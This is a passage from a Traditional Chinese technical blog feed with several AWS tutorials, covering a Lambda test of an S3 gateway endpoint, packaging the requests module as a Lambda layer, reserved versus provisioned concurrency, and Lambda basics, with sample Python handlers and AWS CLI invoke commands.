class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> boto3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;CREATE CLIENT&quot;</span>)</span><br><span class="line">    s3 = boto3.client(<span class="string">&quot;s3&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;START REQUEST&quot;</span>)</span><br><span class="line">    resp = s3.list_objects(Bucket=<span class="string">&quot;testbucket4-s3gateway-endpoint&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(resp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;statusCode&#x27;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: json.dumps(<span class="string">&#x27;Hello from Lambda!&#x27;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>In this Lambda code, Lambda will try to list the objects in the bucket, can print out the information of  response object in the log.</p><ul><li>Configure policy of Lambda execution role</li></ul><p>I simply attach AWS Managed Policy <code>AmazonS3FullAccess</code> to the execution role for testing</p><blockquote><p>Notice, you should not give full access to your Lambda function in production mode, make sure giving adequient permssion to the role.</p></blockquote><p><img src="https://i.imgur.com/U3mPX0h.png" alt="Imgur"></p><h2 id="Check-invocations"><a href="#Check-invocations" class="headerlink" title="Check invocations"></a>Check invocations</h2><ul><li>Press <code>test</code> button in the Lambda console, you’ll noticee the lambda get invoked successfully</li></ul><p><img src="https://i.imgur.com/WB3iyyD.png" alt="Imgur"></p><ul><li>Then you need to check the invocation logs in CloudWatch</li></ul><p><img src="https://i.imgur.com/j5q8yCp.png" alt="Imgur"></p><p>You can see that the object information were listed and printed out in the invocation logs.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3">https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#types-of-vpc-endpoints-for-s3">https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#types-of-vpc-endpoints-for-s3</a><br>[3] <a href="https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#accessing-s3-interface-endpoints">https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#accessing-s3-interface-endpoints</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> S3 </tag>
            
            <tag> Endpoints </tag>
            
            <tag> Gateway </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lambda_layer 概念和實作</title>
      <link href="/posts/f40d2e89.html"/>
      <url>/posts/f40d2e89.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>針對 Lambda 設定，絕大多數人一定碰過 <code>ImportModuleError</code>  所以各位可以跟著以下的情境，開一個一樣的 Lambda 環境逐步操作。</p><h2 id="情境"><a href="#情境" class="headerlink" title="情境"></a>情境</h2><ul><li>Region: <code>IAD(us-east-1)</code></li><li>Runtime: <code>Python3.11</code></li><li>Lambda Name: “ITHomeLambdaFunction”</li><li>Lambda code<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="comment"># TODO implement</span></span><br><span class="line">    x = requests.get(<span class="string">&#x27;https://www.ntust.edu.tw/&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(x.text)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;statusCode&#x27;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: json.dumps(<span class="string">&#x27;Hello from Lambda!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="Error-Runtime-ImportModuleError"><a href="#Error-Runtime-ImportModuleError" class="headerlink" title="[Error]: Runtime.ImportModuleError"></a>[Error]: Runtime.ImportModuleError</h2><p>如果你按照上述情境部署，並且進行測試，可能會報出類似下面的錯誤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;errorMessage&quot;: &quot;Unable to import module &#x27;lambda_function&#x27;: No module named &#x27;requests&#x27;&quot;,</span><br><span class="line">  &quot;errorType&quot;: &quot;Runtime.ImportModuleError&quot;,</span><br><span class="line">  &quot;requestId&quot;: &quot;.......&quot;,</span><br><span class="line">  &quot;stackTrace&quot;: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這個錯誤的原因在於，在 AWS Lambda python 3.8 Runtime 之後的版本就沒有原生支援 requests 模組，會需要自己添加<strong>層（layer）</strong></p><h2 id="什麼是-Lambda-層（Layer）"><a href="#什麼是-Lambda-層（Layer）" class="headerlink" title="什麼是 Lambda 層（Layer）"></a>什麼是 Lambda 層（Layer）</h2><p>在 Lambda 中， Layer 是用來存放dependency 或者是模組用的zip 壓縮檔。不同的 Lambda 函數也可以通過 layer 來去共享資料。</p><p>一旦你為你的 Lambda 函數新增一個 Layer，<strong>Lambda 就會去將你 layer當中的資料放到 Lambda 執行環境中的 <code>/opt</code> 目錄底下</strong>。</p><p><img src="https://hackmd.io/_uploads/H1a_iXvk6.png"></p><blockquote><p>注意： 每個函數最多只能包含5個 Layer </p></blockquote><h2 id="打包模組到-Layer"><a href="#打包模組到-Layer" class="headerlink" title="打包模組到 Layer"></a>打包模組到 Layer</h2><p>每個 Layer 當中的模組，隨著你使用 Runtime 的不同，打包 zip檔時會需要遵循不同的檔案結構 [1]。</p><p>以 Python 來說 檔案結構可以是:</p><ul><li><code>/opt/python</code></li><li><code>/opt/python/lib/python3.x/site-packages </code></li></ul><p>而所有 Runtime 都支援以下兩種額外的目錄：</p><ul><li><code>/bin (PATH)</code></li><li><code>/lib (LD_LIBRARY_PATH)</code></li></ul><p>現在我們就來為 requests 打包成壓縮檔吧</p><ol><li>本機封裝層內容，請執行下面的指令，若您的套件安裝工具是 pip3 則將指令開頭替換成 pip3</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests --target=./python </span><br></pre></td></tr></table></figure><p>這會在你本地當中建立 python&#x2F; 目錄，並將所需的模組下載到目錄中，請注意這裡的目錄名稱需要與 Runtime 所使用的語言匹配。</p><ol start="2"><li><p>打包目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r layer.zip python/</span><br></pre></td></tr></table></figure><p>去將 python 目錄底下的所有檔案打包至一個 zip檔</p></li><li><p>在Lambda 主控台中，左側導覽區域中有個 <strong>layer</strong>，點選後會跳轉至layer頁面，可以在頁面中選擇新增新的layer</p></li></ol><p><img src="https://hackmd.io/_uploads/SyjslEwya.png"></p><p>為Layer 取名並且在頁面中上傳剛才建立的 <code>layer.zip</code>，接著選擇 Runtime 以及架構後就可以建立Layer了。</p><p><img src="https://hackmd.io/_uploads/HkELWNPJa.png"></p><p>完成後就回到 Lambda 主頁去新增 Layer</p><p><img src="https://hackmd.io/_uploads/HkbdbNvyp.png"></p><p>新增 Layer 的頁面中選擇 Custom Layer，就可以看到剛剛建立的 Layer了。</p><p><img src="https://hackmd.io/_uploads/S1esbVwJp.png"></p><h2 id="測試"><a href="#測試" class="headerlink" title="測試"></a>測試</h2><p>這時再度從主控台按下測試，就不會報錯了</p><p><img src="https://hackmd.io/_uploads/rkNaf4v16.png"></p><p>或者通過 AWS CLI 去調用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke \</span><br><span class="line">    --cli-binary-format raw-in-base64-out \</span><br><span class="line">    --function-name ITHomeLambdaFunction \</span><br><span class="line">    --payload &#x27;&#123; &quot;Test&quot;: &quot;ITHome&quot; &#125;&#x27; \</span><br><span class="line">    response.json</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/HkRKONw1a.png"></p><p>去看 CloudWatch 也能收到資料</p><blockquote><p>雖然把吐回來的東西拆成一個一個log entry 很怪XD</p></blockquote><p><img src="https://hackmd.io/_uploads/ryK-tEvkp.png"></p><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/packaging-layers.html#packaging-layers-paths">每個 Lambda 執行時間的層路徑</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWS Lambda知識整理 | 佈建並行 | 預留並行</title>
      <link href="/posts/a09fae.html"/>
      <url>/posts/a09fae.html</url>
      
        <content type="html"><![CDATA[<h2 id="回顧"><a href="#回顧" class="headerlink" title="回顧"></a>回顧</h2><p>前面有提及了 Lambda 的基本介紹、Lambda Runtime、權限配置 以及從日誌上觀察初始化時間以及函數執行時間。</p><p>最後我們有提到一個問題，那就是</p><blockquote><p>如果我們用 AWS CLI 去調用 Lambda 函數，用 Terminal 一次開三個Tab同時調用我們的 Lambda 函數會發生什麼事？</p></blockquote><h2 id="實驗一-設置-Reserved-Concurrency"><a href="#實驗一-設置-Reserved-Concurrency" class="headerlink" title="實驗一 - 設置 Reserved Concurrency"></a>實驗一 - 設置 Reserved Concurrency</h2><p>我們執行以下指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke \</span><br><span class="line">    --function-name TestInvocations \</span><br><span class="line">    --cli-binary-format raw-in-base64-out \</span><br><span class="line">    --payload &#x27;&#123; &quot;name&quot;: &quot;test&quot; &#125;&#x27; \</span><br><span class="line">    response.json</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/ry_jkJsRn.png"></p><p>事實上他都可以成功，並且會在 CloudWatch 上產生三筆Log Stream。 </p><p><img src="https://hackmd.io/_uploads/SJ64-1iCn.png"></p><p>但如果我們去設定動一點手腳，我們將某個叫做 <strong>Reserved Concurrency</strong> 的設定調整成1，並按下 saved。並且重新透過 CLI 執行調用的指令，看會發生什麼事。</p><p><img src="https://hackmd.io/_uploads/Sk6GZJsCn.png"></p><p>這時候會發現，只有一個請求成功回傳200，其他都被 Throttled。會回傳 <code>TooManyRequestsException</code> 的錯誤訓息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An error occurred (TooManyRequestsException) when calling the Invoke operation</span><br></pre></td></tr></table></figure><p>這必須提到 Lambda 應對同時間大量請求的處理機制。</p><blockquote><p>首先，什麼是 Reserved Concurrency? 什麼又是 Unresereved Concurrency?</p></blockquote><h2 id="預留並行-Reserved-Concurrency"><a href="#預留並行-Reserved-Concurrency" class="headerlink" title="預留並行(Reserved Concurrency)"></a>預留並行(Reserved Concurrency)</h2><p>談到 Concurrency，中文叫做並行或併發。這代表什麼？這代表同一時間的多個請求。為了應對這同時來臨的請求，Lambda 函數會去自動擴展。 Serverless 到好處就是，你不需要考量該如何為 Lambda 設置擴展，像是怎麼設定 auto-scaling 的功能。</p><p>在 Lambda 當中，對於同一個函數，使用者只需要考量「<strong>對於這個Lambda 函數，你會需要隨時為它保留多少數量的執行個體？</strong></p><p>這時，你就可以考慮為你的函數設定 Reserved Concurrency。</p><p>預留並行是要分配給函數的並行執行個體數量上限。當某個函數具有預留並行時，其他函數都無法使用該並行。</p><p><strong>如果你在 Lambda 主控台上設定 Reserved Concurrency為 1，就會從 Unreserved Concurrency 當中扣除掉 1</strong>。</p><p>而這個設定是區域型的限制 (Regional)，若你為某個函數設定Resevered Concurrecny 為 100 那剩下的 900 就會是由區域內其他函數共用。</p><blockquote><p>可以為一個函數保留多少數量的 Concurrency?</p></blockquote><p>答案會是， <code>UnreservedConcurrency - 100</code> 數量的並行。<br>也就是說一個函數不可以獨佔所有的並行僅為這個函數來執行，起碼會留下 100 個並行數量給其他函數共用。</p><blockquote><p>你要如何決定你的函數改保留多少並行？</p></blockquote><p>你可以透鍋觀察 CloudWatch 指標 <code>ConcurrentExecutions</code> 來決定 [1]。 這個指標可以觀察到對於你的函數而言，一天下來不同時間段的並行請求數量，假設這個函數一天一次最多會有 30個請求進來，並且這個函數對你很重要，那就可以考慮保留 30 個 Lambda 執行個體來處理請求。</p><blockquote><p>另外值得一提的是，設定函數的預留並行不會收費</p></blockquote><h2 id="佈建並行-（Provision-Conccurency）"><a href="#佈建並行-（Provision-Conccurency）" class="headerlink" title="佈建並行 （Provision Conccurency）"></a>佈建並行 （Provision Conccurency）</h2><p>可能會有人好奇，如果函數會根據請求擴展，那啟動新的執行環境，這樣對於 time-sensitive 的請求來說，延遲不會很久嗎？</p><p><img src="https://hackmd.io/_uploads/ByoYHrrkp.png"></p><blockquote><p>圖片來源： AWS 官網</p></blockquote><p>這個想法沒錯，可以看到上圖的數字4，就是這樣的狀況。</p><p>這代表 3 個執行環境在處理 3 個請求，但第4個請求出來時，就必須初始化一個新的 Lambda 執行環境。 這樣就勢必有延遲，需要等待 Runtime 啟動，下載 Lambda code 和 dependency，以及去執行 Handler 以外的程式區塊（如果有的話）。</p><p>佈建並行的意義在於 <strong>「為函數預先初始化多個環境執行個體，有助於縮短冷啟動延遲」</strong></p><p><strong>冷啟動延遲 （Cold Start）</strong> 就是 Lambda 執行環境在啟動載入時，這段不可控的延遲時間（不包含 Function Init, 也就是執行 handler 程式外區段的初始化時間）。這部分我們會在後面提到。</p><p>回到 Provision Concurrency，所以如果設定了 Provision Concurrency，圖片比較會類似下面。</p><p>假設 Provision Concurrency 設成4。 那一開始就會有四個 Lambda 執行環境進行初始化。並且後續的請求都會重用那四個 Lambda 環境，也就是說當這裡就保證了一定會有 4個初始化過的 Lambda 環境存在，對於時間敏感度高的請求，就比較適合設定這個功能，才不用再度收到初始化的延遲影響。</p><p><img src="https://hackmd.io/_uploads/rJ1GiHSJT.png"></p><p>那要怎麼設定 Provision Concurrency 呢？[2]</p><blockquote><p>提醒：為函數設定 Provision Concurrency 是要收費的</p></blockquote><h2 id="實驗二-設置-Provision-Concurrency"><a href="#實驗二-設置-Provision-Concurrency" class="headerlink" title="實驗二 - 設置 Provision Concurrency"></a>實驗二 - 設置 Provision Concurrency</h2><p>在設定 Provision Concurrency之前有個前置作業要做，也就是<strong>發布你的函數版本</strong>。</p><p>每個函數在發布版本之前的預設都是： <strong>$LATEST</strong>，但 Provision Concurrency 並不能設定在 $LATEST 版本的函數上面，這是一個限制。</p><p>可以先在主頁中的 <strong>Version</strong> 找到 <strong>Publish new version</strong><br><img src="https://hackmd.io/_uploads/H1khZIrya.png"></p><p>接著可以填入這個版本的敘述，然後按下 Publish<br><img src="https://hackmd.io/_uploads/By2C-UH1T.png"></p><p>之後就會調轉到 Version 1 的 Lambda函數主控台 （與 $LATEST 函數主控台略微不同）。這時應該會看到 Provision Concurrency 的設定畫面，點選後就可以為 Version 1 的函數設定並行。</p><p><img src="https://hackmd.io/_uploads/Bk4KM8r1T.png"></p><p>下方可以填入你想要維持 warm start 狀態的 Lambda 並行數量。<br>底下可以注意到 “10 available”。這個數字是哪來的呢？</p><p>其實這個數字就是你函數的 <strong>Reserved Concurrency 的數量</strong></p><p>可以回到 $LATEST 版本的函數主控台畫面。</p><p><img src="https://hackmd.io/_uploads/SJMrmLSyp.png"></p><p>底下可以看到我們設定數量就是 10。<br><img src="https://hackmd.io/_uploads/B1OLmIBJp.png"></p><blockquote><p><strong>因此我們可以設定佈建並行的數量，是取決於你為該函數設定的保留並行數量</strong></p></blockquote><p>我們這裡將佈建並行數量設定成 5。</p><p><img src="https://hackmd.io/_uploads/SkPZV8S1T.png"></p><p>之後會需要點時間來建立並行。</p><p>接著我們來測試設定的 Provision Concurrency。</p><p>首先，以下是測試用的 code (在version1 函數當中的程式碼)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json, time</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sleep for 3 secs&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;statusCode&#x27;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: json.dumps(<span class="string">&#x27;Hello from Lambda!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我們通過 AWS CLI 來去觸發 Lambda 函數</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke \</span><br><span class="line">--function-name TestInvocations \</span><br><span class="line">--cli-binary-format raw-in-base64-out \</span><br><span class="line">--qualifier 1 \</span><br><span class="line">--payload &#x27;&#123; &quot;key&quot;: &quot;value&quot; &#125;&#x27; </span><br><span class="line">response.json</span><br></pre></td></tr></table></figure><p>在 <code>--qualifier</code> 參數後面接的是版本名稱或者是 Alias 名稱。</p><p>可以先暫停，在實際觸發錢先去觀察 CloudWatch 上的觸發日誌</p><p><img src="https://hackmd.io/_uploads/ryTU7dBJ6.png"></p><p>會發現有多個執行環境已經先預熱完成了</p><blockquote><p>至於數量為何大於 Provision Concurrency 數量這點尚未確定<br>可能是為了可用性？</p></blockquote><p>在開多個終端送請求後，可以發現一樣，因為執行環境已經預熱好，因此不需要重新 Init，可以基於 Container-Reuse 的特性來在現有的執行環境執行請求。</p><p><img src="https://hackmd.io/_uploads/rkdt4urya.png"></p><h2 id="Reserved-Concurrency-vs-Provison-Concurrency"><a href="#Reserved-Concurrency-vs-Provison-Concurrency" class="headerlink" title="Reserved Concurrency vs. Provison Concurrency"></a>Reserved Concurrency vs. Provison Concurrency</h2><p><img src="https://hackmd.io/_uploads/B1BXrdB1a.png"></p><blockquote><p>圖片來源： <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#reserved-and-provisioned">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#reserved-and-provisioned</a></p></blockquote><p>用官方展示一張對比圖來解釋這兩種並行的差異。</p><p>以下是我整理這兩種並行的差異</p><table><thead><tr><th></th><th>RC(Reserved Concurrency)</th><th>PC(Provision Concurrency)</th></tr></thead><tbody><tr><td>費用:</td><td>不用收費</td><td>要收費</td></tr><tr><td>特性：</td><td>確保一定數量的Lambda執行環境存在</td><td>確保一定數量的Lambda執行環境存在且這當中有一定數量的執行環境已經初始化過了</td></tr><tr><td>達到limit的反應</td><td>Throtteld <code>TooManyRequest</code></td><td>若還有RC額度，則會擴增執行環境個數，但一樣會有冷啟動，沒有額度則 Throttled</td></tr></tbody></table><blockquote><p>也請參考官方的差異表格 [3]</p></blockquote><h2 id="暴增並行"><a href="#暴增並行" class="headerlink" title="暴增並行"></a>暴增並行</h2><p>所謂的暴增並行（Burst Concurrency），目的也是為了能夠應付突然暴增的請求。</p><p>但面對突然增加的大量請求，Lambda 可能也沒辦法立即擴展來處理，這是為了防止 Lambda 函數過度擴展消耗太多資源。</p><p>所以在因應函數暴增的速度，可以通過設定暴增並行來去增加建立 Lambda 執行環境的最高速度。而這個設定是 Account-Level 的設定。</p><p>但在不同 Region，暴增並行有上限的差異：</p><ul><li><code>us-west-2</code>, <code>us-east-1</code> 以及 <code>eu-west-1</code>的 Region 基本上是上限都是 3000</li><li><code>ap-northeast-1</code>, <code>eu-central-1</code> 還有 <code>us-east-2</code> Region 上限是 1000</li><li>其他 Region 都是 500</li></ul><p>以 us-east-1 為例，暴增並行每分鐘擴展 500 個單位的暴增擴展（額外的 Lambda 執行環境），直到達到需求或者是達到上限 3000個。</p><p>超出上限的請求會被 Throttled (Status Code: 429)</p><p>有興趣的可以直接看官方文件針對暴增並行的介紹 [5]。</p><h2 id="冷啟動-（Cold-Start）"><a href="#冷啟動-（Cold-Start）" class="headerlink" title="冷啟動 （Cold Start）"></a>冷啟動 （Cold Start）</h2><blockquote><p>Lambda 在 Init 階段做了哪些事情</p></blockquote><ul><li>當 Lambda 服務透過 Lambda API 收到啟動 Lambda 函數的請求時服務本身會去下載函數程式碼。</li><li>這個程式碼會存放在 Lambda 內部的 S3 bucket當中</li><li>如果是用函數是用容器建立，則函數程式碼會放在 <strong>Amazon ECR</strong> 上</li><li>接著會去建立具有指定記憶體大小以及指定 Runtime 的環境 </li><li>接著會去執行 函數 Hander之外的初始化程式</li></ul><p>根據 [4]，可以知道上面的步驟除了執行函數初始化程式外，都屬於 Cold Start 的範圍。而執行函數 handler 外的程式碼就算是 warm start，也就是我們可以控制的範圍了。</p><blockquote><p>函數又是怎麼能夠一直保持是 “warm”的？</p></blockquote><p>官方文件說明是通過一種 <strong>pinging mechanism</strong>。主要實踐方式是透過設定 <strong>Eventbridge</strong> 的規則安排每分鐘調用一次函數來幫助函數執行環境保持活躍，</p><p>減緩冷啟動的方式，目前推薦的還是藉由設定 Provision Concurrency。<br>另外還有 <strong>Snapstart</strong>，這個我們可以留到後面繼續介紹～</p><h2 id="參考文件"><a href="#參考文件" class="headerlink" title="參考文件"></a>參考文件</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/configuration-concurrency.html#estimating-reserved-concurrency">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/configuration-concurrency.html#estimating-reserved-concurrency</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/provisioned-concurrency.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/provisioned-concurrency.html</a><br>[3] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#comparing-reserved-provisioned">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#comparing-reserved-provisioned</a><br>[4] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/operatorguide/execution-environments.html#cold-start-latency">https://docs.aws.amazon.com/zh_tw/lambda/latest/operatorguide/execution-environments.html#cold-start-latency</a><br>[5]<a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/burst-concurrency.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/burst-concurrency.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lambda 基本認識 feat.容器重用小實驗</title>
      <link href="/posts/c79cef2b.html"/>
      <url>/posts/c79cef2b.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先，為什麼談到無伺服器總是會有人提到 Lambda ?</p><p>以下就開始來介紹這個服務</p><h2 id="FaaS-Function-as-a-Service"><a href="#FaaS-Function-as-a-Service" class="headerlink" title="FaaS (Function as a Service)"></a>FaaS (Function as a Service)</h2><p>一旦談到無伺服器運算，就會提到他的核心概念，<strong>功能即服務(Function as a Service)</strong> ，這裡引用維基百科對於 FaaS 的解釋</p><blockquote><p>FaaS 是雲端運算的一種模型。以平台即服務（PaaS）為基礎，無伺服器運算提供一個微型的架構，終端客戶不需要部署、配置或管理伺服器服務，程式碼運行所需要的伺服器服務皆由雲端平台來提供。</p></blockquote><p>沒錯，這個概念的核心就是讓使用者專注在設計產品或業務邏輯，而不需費心在部署配置或是設定伺服器。</p><p>而最早實踐這個概念並推出服務的，就是 AWS 在 2014 年推出的 Lambda 服務。（當然後續也有 Microsoft 的 Azure Function）</p><h2 id="Lambda-函數"><a href="#Lambda-函數" class="headerlink" title="Lambda 函數"></a>Lambda 函數</h2><blockquote><p>Lambda 在高可用性的運算基礎設施上執行您的程式碼，並執行所有運算資源的管理，包括伺服器與作業系統維護、容量佈建與自動擴展以及記錄。使用 Lambda，您唯一需要做的就是在 Lambda 支援的其中一種語言執行期中提供您的程式碼 [1]。[name&#x3D;AWS Documents] </p></blockquote><p>以行為上來看基本上就是，我底下的這張圖。會有某個上游的觸發器（Trigger），通常是某種服務來去調用 Lambda 函數，或者是手動透過AWS CLI 的方式調用。 Lambda 執行函數完畢後將執行結果回傳給原服務，並且可以將觸發下游的目的地（ Destination）這通常也是某個服務。</p><p><img src="https://hackmd.io/_uploads/SyPe6nOC2.png"></p><p>現在假設你是一個新手，剛接觸 Lambda 你可能會急著想要打開你的 Console ，用範例程式，或者有些人範例程式寫什麼都不看就刪掉，直接複製貼上本地程式，然後透過預設的 Event 來去測試你的 Lambda 函數，然後發現跑不動….</p><p>請別急，在動手前最好先有 Lambda Runtime 以及 Lambda 程式的概念。</p><h2 id="基本規格"><a href="#基本規格" class="headerlink" title="基本規格"></a>基本規格</h2><ul><li>RAM</li><li>Storage</li></ul><h3 id="設置-RAM"><a href="#設置-RAM" class="headerlink" title="設置 - RAM"></a>設置 - RAM</h3><p>RAM 與 CPU 處理效能成正比，可以透過提升 RAM 來連帶提升CPU處理速度<br>    128MB to 3008MB</p><blockquote><p>參考來源:<br><a href="https://koding.work/aws-lambda-performance-is-related-to-memory-size/">https://koding.work/aws-lambda-performance-is-related-to-memory-size/</a></p></blockquote><h2 id="Lambda-Runtimes"><a href="#Lambda-Runtimes" class="headerlink" title="Lambda Runtimes"></a>Lambda Runtimes</h2><p>Lambda 通過使用 Runtime 來支援多種程式語言開發。每個主要的程式設計語言版本都有獨立的 Runtimes。 而這些 Runtime 提供了基本的程式語言的函式庫以及執行環境。</p><p>主流語言都有官方支援的 Runtime 像是 NodeJS, Python, Java, Go, Ruby 等等，並且也支援你去自定義 Runtime。<a href="https://github.com/awslabs/aws-lambda-cpp">像是 C++ Runtime</a>，官方也有提供 Github 和 Post 去寫怎麼使用這種自定義的 Runtimes [3]</p><blockquote><p>小弟就有自定義過 Perl Runtime，但會需要自寫 images..:(</p></blockquote><p>另外， Lambda Runtime 其實都是基於 Amazon Linux 進行開發的。所以基本上如果有自定義 Runtime 的需求，建議都是開個 t2.micro 的 EC2 (選擇 Amazon Linux 相關的 AMI )再來去建構 Runtime。 </p><h2 id="Lambda-程式設計模型"><a href="#Lambda-程式設計模型" class="headerlink" title="Lambda 程式設計模型"></a>Lambda 程式設計模型</h2><p>Lambda 提供的程式設計模型對於所有 Runtime 通用。程式設計模型會定義一個 Handler 來去處理進來的事件。這個做法其實就是將函數的進入點告知 Lambda。執行時間會將包含呼叫事件和內容的物件傳入至 Handler，例如函數名稱和 Request ID。</p><p>如果你建立不同 Runtime 的 Function，應該會在主控台的程式碼區塊上看到不同語言 Handler。</p><p>Handler (Python)[4]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def handler_name(event, context): </span><br><span class="line">    ...</span><br><span class="line">    return some_value</span><br></pre></td></tr></table></figure><p>Handler (Java17)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 